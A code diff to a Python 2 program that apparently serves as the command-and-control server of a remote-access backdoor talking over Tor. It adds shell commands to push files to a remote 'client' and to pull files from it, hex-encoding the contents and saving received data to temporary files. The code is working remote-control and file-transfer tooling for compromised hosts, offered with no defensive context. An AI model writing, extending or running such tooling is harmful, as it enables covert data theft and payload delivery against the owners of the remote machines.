@@ -29,7 +29,7 @@
 # POSSIBILITY OF SUCH DAMAGE.
 
 
-import string,cgi,time,binascii, rsa, random, sys, cmd, readline
+import string,cgi,time,binascii, rsa, random, sys, cmd, readline, tempfile, os
 from os import curdir, sep
 from blowfish import *
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
@@ -42,11 +42,46 @@ class CustomShell(cmd.Cmd):
     def default(self,line):
         self.isShellCmd=True
 
-    def do_test(self,line):
-        print "This is a test"
+    def do_upload(self,file):
+	if file=="":
+		print "We need a file as a parameter"
+		self.help_upload()
+        else:
+		print "trying to upload %s" % file
+        	self.isShellCmd=True
+		if not os.path.isfile(file):
+			print "%s does not exist" % file
+        		self.lastcmd="upload:"
+		else:
+			fd=open(file,'rb')
+			file_contents=fd.read()
+			fd.close()
+	        	self.lastcmd="upload:%s" % binascii.hexlify(file_contents)
+
+    def help_upload(self):
+        print "Uploads a file to the client\n"
+        print "upload <file>\n" 
+
+    def do_download(self,file):
+	if file=="":
+		print "We need a file as a parameter"
+		self.help_download()
+        else:
+		print "trying to download %s" % file
+        	self.isShellCmd=True
+        	self.lastcmd="download:%s" % file
+
+    def help_download(self):
+        print "Downloads a file from the client\n"
+        print "download <file>\n" 
+
+    def do_quit(self,line):
+	print "shutting down the client ..."
+        self.isShellCmd=True
+        self.lastcmd="quit:"
 
     def postcmd(self,stop,line):
-         return self.isShellCmd
+        return self.isShellCmd
         
 
     def cmdloop(self):
@@ -101,13 +136,38 @@ class TorHandler(BaseHTTPRequestHandler):
                         self.command_response,self.passwd=self.get_parameters()
                         self.send_response(200)
                         self.end_headers()
-                        print "%s" % (self.command_response)
+			if self.command_response[0:4]=="cmd:":
+	                        print "%s" % (self.command_response[4:len(self.command_response)])
+			elif self.command_response[0:9]=="download:":
+				self.download_file(self.command_response[9:len(self.command_response)])
+			elif self.command_response[0:7]=="upload:":
+				self.upload_file(self.command_response[7:len(self.command_response)])
+			else:
+	                        print "%s" % (self.command_response)
 
                 else:
                         self.send_response(404)
                         self.end_headers()
             except:
                     print "Lost communication with the client"
+
+    def download_file(self,file_contents):
+	if file_contents != "":
+		fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
+		os.close(fd)
+		print "Saving file to %s ..." % tmpPayload
+		fd=open(tmpPayload,'w')
+		fd.write(binascii.unhexlify(file_contents))
+		fd.close()
+
+	else: print "file does not exist"
+        
+    def upload_file(self,msg):
+	if msg == "":
+		print "Error uploading file"
+	else:
+		print "File uploaded to %s" % binascii.unhexlify(msg)
+
 
 def main():
     try:
